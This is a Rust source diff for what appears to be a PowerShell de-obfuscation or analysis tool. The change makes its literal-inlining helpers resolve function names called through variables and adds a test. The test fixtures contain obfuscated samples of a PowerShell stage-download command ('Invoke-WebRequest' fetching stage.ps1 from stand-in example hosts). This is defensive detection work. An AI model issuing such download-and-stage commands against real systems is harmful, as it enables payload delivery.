@@ -3637,104 +3637,106 @@ fn inline_ps_literal_substring_calls(
     binding: PsSubstringExtractorParamBinding<'_>,
 ) -> String {
     let lower = text.to_ascii_lowercase();
-    let needle = name.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
     let bytes = text.as_bytes();
     let mut matches = Vec::new();
-    let mut search_from = 0;
     let mut match_count = 0;
 
-    while match_count < 128 {
-        let Some(rel) = lower[search_from..].find(&needle) else {
-            break;
-        };
-        let call_start = search_from + rel;
-        let end_name = call_start + name.len();
-        let Some((replace_start, mut pos)) =
-            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
-        else {
-            search_from = end_name;
-            continue;
-        };
-        let parenthesized = bytes.get(pos) == Some(&b'(');
-        if parenthesized {
-            pos = skip_ascii_ws(bytes, pos + 1);
-        }
-        if bytes.get(pos) == Some(&b'-') {
-            if let Some((call_end, replacement)) = inline_ps_named_literal_substring_call(
-                text,
-                pos,
-                parenthesized,
-                binding.value_name,
-                binding.start_name,
-                binding.len_name,
-            ) {
-                matches.push((replace_start, call_end, replacement));
-                search_from = call_end;
-                match_count += 1;
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_substring_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    binding.value_name,
+                    binding.start_name,
+                    binding.len_name,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            if value.len() > 8192 {
+                search_from = value_end;
                 continue;
             }
-        }
-        let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
-            search_from = end_name;
-            continue;
-        };
-        if value.len() > 8192 {
-            search_from = value_end;
-            continue;
-        }
-        pos = skip_ps_arg_separator(bytes, value_end, parenthesized);
-        let Some((first_end, first_num)) = parse_ps_usize_arg(text, pos) else {
-            search_from = value_end;
-            continue;
-        };
-        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-        let Some((second_end, second_num)) = parse_ps_usize_arg(text, pos) else {
-            search_from = first_end;
-            continue;
-        };
-        let mut call_end = second_end;
-        if parenthesized {
-            let after = skip_ascii_ws(bytes, call_end);
-            if bytes.get(after) != Some(&b')') {
-                search_from = second_end;
+            pos = skip_ps_arg_separator(bytes, value_end, parenthesized);
+            let Some((first_end, first_num)) = parse_ps_usize_arg(text, pos) else {
+                search_from = value_end;
                 continue;
+            };
+            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+            let Some((second_end, second_num)) = parse_ps_usize_arg(text, pos) else {
+                search_from = first_end;
+                continue;
+            };
+            let mut call_end = second_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = second_end;
+                    continue;
+                }
+                call_end = after + 1;
             }
-            call_end = after + 1;
-        }
 
-        if binding.value_idx != 0 || binding.start_idx > 2 || binding.len_idx > 2 {
-            search_from = call_end;
-            continue;
-        }
-        let start = match (binding.start_idx, binding.len_idx) {
-            (1, 2) => first_num,
-            (2, 1) => second_num,
-            _ => {
+            if binding.value_idx != 0 || binding.start_idx > 2 || binding.len_idx > 2 {
                 search_from = call_end;
                 continue;
             }
-        };
-        let len = match (binding.start_idx, binding.len_idx) {
-            (1, 2) => second_num,
-            (2, 1) => first_num,
-            _ => {
+            let start = match (binding.start_idx, binding.len_idx) {
+                (1, 2) => first_num,
+                (2, 1) => second_num,
+                _ => {
+                    search_from = call_end;
+                    continue;
+                }
+            };
+            let len = match (binding.start_idx, binding.len_idx) {
+                (1, 2) => second_num,
+                (2, 1) => first_num,
+                _ => {
+                    search_from = call_end;
+                    continue;
+                }
+            };
+            let Some(end) = start.checked_add(len) else {
+                search_from = call_end;
+                continue;
+            };
+            if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
                 search_from = call_end;
                 continue;
             }
-        };
-        let Some(end) = start.checked_add(len) else {
-            search_from = call_end;
-            continue;
-        };
-        if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
-            search_from = call_end;
-            continue;
-        }
 
-        let replacement = format!("'{}'", value[start..end].replace('\'', "''"));
-        matches.push((replace_start, call_end, replacement));
-        search_from = call_end;
-        match_count += 1;
+            let replacement = format!("'{}'", value[start..end].replace('\'', "''"));
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
     }
 
     let mut out = text.to_string();
@@ -3742,6 +3744,18 @@ fn inline_ps_literal_substring_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+fn ps_literal_extractor_call_needles(text: &str, name: &str) -> Vec<String> {
+    let mut needles = vec![name.to_ascii_lowercase()];
+    for (var, value) in ps_string_bindings(text) {
+        if value.eq_ignore_ascii_case(name) {
+            needles.push(format!("${var}"));
+        }
+    }
+    needles.sort();
+    needles.dedup();
+    needles
 }
 
 fn ps_literal_extractor_call_start_and_arg_pos(
@@ -3838,95 +3852,97 @@ fn inline_ps_literal_replace_calls(
     binding: PsReplaceExtractorParamBinding<'_>,
 ) -> String {
     let lower = text.to_ascii_lowercase();
-    let needle_func_name = name.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
     let bytes = text.as_bytes();
     let mut matches = Vec::new();
-    let mut search_from = 0;
     let mut match_count = 0;
 
-    while match_count < 128 {
-        let Some(rel) = lower[search_from..].find(&needle_func_name) else {
-            break;
-        };
-        let call_start = search_from + rel;
-        let end_name = call_start + name.len();
-        let Some((replace_start, mut pos)) =
-            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
-        else {
-            search_from = end_name;
-            continue;
-        };
-        let parenthesized = bytes.get(pos) == Some(&b'(');
-        if parenthesized {
-            pos = skip_ascii_ws(bytes, pos + 1);
-        }
-        if bytes.get(pos) == Some(&b'-') {
-            if let Some((call_end, replacement)) = inline_ps_named_literal_replace_call(
-                text,
-                pos,
-                parenthesized,
-                binding.value_name,
-                binding.needle_name,
-                binding.repl_name,
-            ) {
-                matches.push((replace_start, call_end, replacement));
-                search_from = call_end;
-                match_count += 1;
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_replace_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    binding.value_name,
+                    binding.needle_name,
+                    binding.repl_name,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            if first.len() > 8192 {
+                search_from = first_end;
                 continue;
             }
-        }
-        let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
-            search_from = end_name;
-            continue;
-        };
-        if first.len() > 8192 {
-            search_from = first_end;
-            continue;
-        }
-        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-        let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
-            search_from = first_end;
-            continue;
-        };
-        pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
-        let Some((third_end, third)) = parse_ps_static_quoted_literal(text, pos) else {
-            search_from = second_end;
-            continue;
-        };
-        let mut call_end = third_end;
-        if parenthesized {
-            let after = skip_ascii_ws(bytes, call_end);
-            if bytes.get(after) != Some(&b')') {
-                search_from = third_end;
+            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+            let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = first_end;
                 continue;
+            };
+            pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
+            let Some((third_end, third)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = second_end;
+                continue;
+            };
+            let mut call_end = third_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = third_end;
+                    continue;
+                }
+                call_end = after + 1;
             }
-            call_end = after + 1;
-        }
 
-        let args = [&first, &second, &third];
-        if binding.value_idx >= args.len()
-            || binding.needle_idx >= args.len()
-            || binding.repl_idx >= args.len()
-        {
+            let args = [&first, &second, &third];
+            if binding.value_idx >= args.len()
+                || binding.needle_idx >= args.len()
+                || binding.repl_idx >= args.len()
+            {
+                search_from = call_end;
+                continue;
+            }
+            let value = args[binding.value_idx];
+            let needle = args[binding.needle_idx];
+            let repl = args[binding.repl_idx];
+            if needle.is_empty() {
+                search_from = call_end;
+                continue;
+            }
+            let replaced = value.replace(needle, repl);
+            if replaced.len() > 8192 {
+                search_from = call_end;
+                continue;
+            }
+            let replacement = format!("'{}'", replaced.replace('\'', "''"));
+            matches.push((replace_start, call_end, replacement));
             search_from = call_end;
-            continue;
+            match_count += 1;
         }
-        let value = args[binding.value_idx];
-        let needle = args[binding.needle_idx];
-        let repl = args[binding.repl_idx];
-        if needle.is_empty() {
-            search_from = call_end;
-            continue;
-        }
-        let replaced = value.replace(needle, repl);
-        if replaced.len() > 8192 {
-            search_from = call_end;
-            continue;
-        }
-        let replacement = format!("'{}'", replaced.replace('\'', "''"));
-        matches.push((replace_start, call_end, replacement));
-        search_from = call_end;
-        match_count += 1;
     }
 
     let mut out = text.to_string();
@@ -3990,111 +4006,113 @@ fn inline_ps_literal_trim_calls(
     kind: PsTrimKind,
 ) -> String {
     let lower = text.to_ascii_lowercase();
-    let needle_name = name.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
     let bytes = text.as_bytes();
     let mut matches = Vec::new();
-    let mut search_from = 0;
     let mut match_count = 0;
 
-    while match_count < 128 {
-        let Some(rel) = lower[search_from..].find(&needle_name) else {
-            break;
-        };
-        let call_start = search_from + rel;
-        let end_name = call_start + name.len();
-        let Some((replace_start, mut pos)) =
-            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
-        else {
-            search_from = end_name;
-            continue;
-        };
-        let parenthesized = bytes.get(pos) == Some(&b'(');
-        if parenthesized {
-            pos = skip_ascii_ws(bytes, pos + 1);
-        }
-        if bytes.get(pos) == Some(&b'-') {
-            if let Some((call_end, replacement)) = inline_ps_named_literal_trim_call(
-                text,
-                pos,
-                parenthesized,
-                value_name,
-                chars_name,
-                kind,
-            ) {
-                matches.push((replace_start, call_end, replacement));
-                search_from = call_end;
-                match_count += 1;
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
                 continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
             }
-        }
-        let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
-            search_from = end_name;
-            continue;
-        };
-        if first.len() > 8192 {
-            search_from = first_end;
-            continue;
-        }
-
-        let (call_end, replacement) = if let Some(chars_idx) = chars_idx {
-            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-            let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_trim_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    value_name,
+                    chars_name,
+                    kind,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            if first.len() > 8192 {
                 search_from = first_end;
                 continue;
-            };
-            let mut call_end = second_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = second_end;
-                    continue;
-                }
-                call_end = after + 1;
             }
 
-            let args = [&first, &second];
-            let Some(value) = args.get(value_idx).copied() else {
-                search_from = call_end;
-                continue;
-            };
-            let Some(chars) = args.get(chars_idx).copied() else {
-                search_from = call_end;
-                continue;
-            };
-            if chars.is_empty() {
-                search_from = call_end;
-                continue;
-            }
-            let trimmed = kind.apply_chars(value, chars);
-            if trimmed.len() > 8192 {
-                search_from = call_end;
-                continue;
-            }
-            (call_end, format!("'{}'", trimmed.replace('\'', "''")))
-        } else {
-            let mut call_end = first_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
+            let (call_end, replacement) = if let Some(chars_idx) = chars_idx {
+                pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+                let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
                     search_from = first_end;
                     continue;
+                };
+                let mut call_end = second_end;
+                if parenthesized {
+                    let after = skip_ascii_ws(bytes, call_end);
+                    if bytes.get(after) != Some(&b')') {
+                        search_from = second_end;
+                        continue;
+                    }
+                    call_end = after + 1;
                 }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
-                search_from = call_end;
-                continue;
-            }
-            let trimmed = kind.apply_default(&first);
-            if trimmed.len() > 8192 {
-                search_from = call_end;
-                continue;
-            }
-            (call_end, format!("'{}'", trimmed.replace('\'', "''")))
-        };
-        matches.push((replace_start, call_end, replacement));
-        search_from = call_end;
-        match_count += 1;
+
+                let args = [&first, &second];
+                let Some(value) = args.get(value_idx).copied() else {
+                    search_from = call_end;
+                    continue;
+                };
+                let Some(chars) = args.get(chars_idx).copied() else {
+                    search_from = call_end;
+                    continue;
+                };
+                if chars.is_empty() {
+                    search_from = call_end;
+                    continue;
+                }
+                let trimmed = kind.apply_chars(value, chars);
+                if trimmed.len() > 8192 {
+                    search_from = call_end;
+                    continue;
+                }
+                (call_end, format!("'{}'", trimmed.replace('\'', "''")))
+            } else {
+                let mut call_end = first_end;
+                if parenthesized {
+                    let after = skip_ascii_ws(bytes, call_end);
+                    if bytes.get(after) != Some(&b')') {
+                        search_from = first_end;
+                        continue;
+                    }
+                    call_end = after + 1;
+                }
+                if value_idx != 0 {
+                    search_from = call_end;
+                    continue;
+                }
+                let trimmed = kind.apply_default(&first);
+                if trimmed.len() > 8192 {
+                    search_from = call_end;
+                    continue;
+                }
+                (call_end, format!("'{}'", trimmed.replace('\'', "''")))
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
     }
 
     let mut out = text.to_string();
@@ -4321,109 +4339,111 @@ fn inline_ps_literal_split_index_calls(
     binding: PsSplitExtractorParamBinding<'_>,
 ) -> String {
     let lower = text.to_ascii_lowercase();
-    let needle_name = name.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
     let bytes = text.as_bytes();
     let mut matches = Vec::new();
-    let mut search_from = 0;
     let mut match_count = 0;
 
-    while match_count < 128 {
-        let Some(rel) = lower[search_from..].find(&needle_name) else {
-            break;
-        };
-        let call_start = search_from + rel;
-        let end_name = call_start + name.len();
-        let Some((replace_start, mut pos)) =
-            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
-        else {
-            search_from = end_name;
-            continue;
-        };
-        let parenthesized = bytes.get(pos) == Some(&b'(');
-        if parenthesized {
-            pos = skip_ascii_ws(bytes, pos + 1);
-        }
-        if bytes.get(pos) == Some(&b'-') {
-            if let Some((call_end, replacement)) = inline_ps_named_literal_split_index_call(
-                text,
-                pos,
-                parenthesized,
-                binding.value_name,
-                binding.sep_name,
-                binding.index_name,
-            ) {
-                matches.push((replace_start, call_end, replacement));
-                search_from = call_end;
-                match_count += 1;
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
                 continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
             }
-        }
-        let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
-            search_from = end_name;
-            continue;
-        };
-        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-        let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
-            search_from = first_end;
-            continue;
-        };
-        pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
-        let Some((third_end, third)) = parse_ps_literal_or_usize_arg(text, pos) else {
-            search_from = second_end;
-            continue;
-        };
-        let mut call_end = third_end;
-        if parenthesized {
-            let after = skip_ascii_ws(bytes, call_end);
-            if bytes.get(after) != Some(&b')') {
-                search_from = third_end;
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_split_index_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    binding.value_name,
+                    binding.sep_name,
+                    binding.index_name,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = end_name;
                 continue;
+            };
+            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+            let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = first_end;
+                continue;
+            };
+            pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
+            let Some((third_end, third)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = second_end;
+                continue;
+            };
+            let mut call_end = third_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = third_end;
+                    continue;
+                }
+                call_end = after + 1;
             }
-            call_end = after + 1;
-        }
 
-        let args = [first, second, third];
-        let Some(value) = args
-            .get(binding.value_idx)
-            .and_then(PsLiteralOrUsizeArg::as_str)
-        else {
+            let args = [first, second, third];
+            let Some(value) = args
+                .get(binding.value_idx)
+                .and_then(PsLiteralOrUsizeArg::as_str)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(sep) = args
+                .get(binding.sep_idx)
+                .and_then(PsLiteralOrUsizeArg::as_str)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(index) = args
+                .get(binding.index_idx)
+                .and_then(PsLiteralOrUsizeArg::as_usize)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            if value.len() > 8192 {
+                search_from = call_end;
+                continue;
+            }
+            if sep.is_empty() {
+                search_from = call_end;
+                continue;
+            }
+            let Some(part) = value.split(sep).nth(index) else {
+                search_from = call_end;
+                continue;
+            };
+            if part.len() > 8192 {
+                search_from = call_end;
+                continue;
+            }
+            let replacement = format!("'{}'", part.replace('\'', "''"));
+            matches.push((replace_start, call_end, replacement));
             search_from = call_end;
-            continue;
-        };
-        let Some(sep) = args
-            .get(binding.sep_idx)
-            .and_then(PsLiteralOrUsizeArg::as_str)
-        else {
-            search_from = call_end;
-            continue;
-        };
-        let Some(index) = args
-            .get(binding.index_idx)
-            .and_then(PsLiteralOrUsizeArg::as_usize)
-        else {
-            search_from = call_end;
-            continue;
-        };
-        if value.len() > 8192 {
-            search_from = call_end;
-            continue;
+            match_count += 1;
         }
-        if sep.is_empty() {
-            search_from = call_end;
-            continue;
-        }
-        let Some(part) = value.split(sep).nth(index) else {
-            search_from = call_end;
-            continue;
-        };
-        if part.len() > 8192 {
-            search_from = call_end;
-            continue;
-        }
-        let replacement = format!("'{}'", part.replace('\'', "''"));
-        matches.push((replace_start, call_end, replacement));
-        search_from = call_end;
-        match_count += 1;
     }
 
     let mut out = text.to_string();
@@ -4517,43 +4537,45 @@ fn skip_ps_arg_separator(bytes: &[u8], pos: usize, parenthesized: bool) -> usize
 
 fn inline_ps_literal_calls(text: &str, name: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    let needle = name.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
     let bytes = text.as_bytes();
     let mut matches = Vec::new();
-    let mut search_from = 0;
 
-    while let Some(rel) = lower[search_from..].find(&needle) {
-        let start = search_from + rel;
-        let end_name = start + name.len();
-        let Some((replace_start, mut pos)) =
-            ps_literal_extractor_call_start_and_arg_pos(bytes, start, end_name)
-        else {
-            search_from = end_name;
-            continue;
-        };
-        let parenthesized = bytes.get(pos) == Some(&b'(');
-        if parenthesized {
-            pos = skip_ascii_ws(bytes, pos + 1);
-        }
-        if bytes.get(pos) != Some(&b'\'') {
-            search_from = end_name;
-            continue;
-        }
-        let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
-            search_from = end_name;
-            continue;
-        };
-        let mut call_end = literal_end;
-        if parenthesized {
-            let after = skip_ascii_ws(bytes, call_end);
-            if bytes.get(after) != Some(&b')') {
+    for needle in needles {
+        let mut search_from = 0;
+        while let Some(rel) = lower[search_from..].find(&needle) {
+            let start = search_from + rel;
+            let end_name = start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) != Some(&b'\'') {
                 search_from = end_name;
                 continue;
             }
-            call_end = after + 1;
+            let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            let mut call_end = literal_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = end_name;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            matches.push((replace_start, call_end, value));
+            search_from = call_end;
         }
-        matches.push((replace_start, call_end, value));
-        search_from = call_end;
     }
 
     let mut out = text.to_string();
@@ -7295,6 +7317,28 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
                 "'Invoke-WebRequest -Uri https://ps-quoted-call-operator-trim-extractor.example/stage.ps1'"
             ),
             "quoted call-operator trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_variable_call_operator_trim_extractor_call_is_rewritten() {
+        let text = r#"$fn = 'Clean'
+function Clean($value,$chars) {
+  return $value.Trim($chars)
+}
+& $fn '~~~Invoke-WebRequest -Uri https://ps-variable-call-operator-trim-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-variable-call-operator-trim-extractor.example/stage.ps1'"
+            ),
+            "variable call-operator trim extractor call was not rewritten:\n{out}"
+        );
+        assert!(
+            !out.contains("& 'Invoke-WebRequest"),
+            "variable call-operator rewrite left a dangling call operator:\n{out}"
         );
     }
 
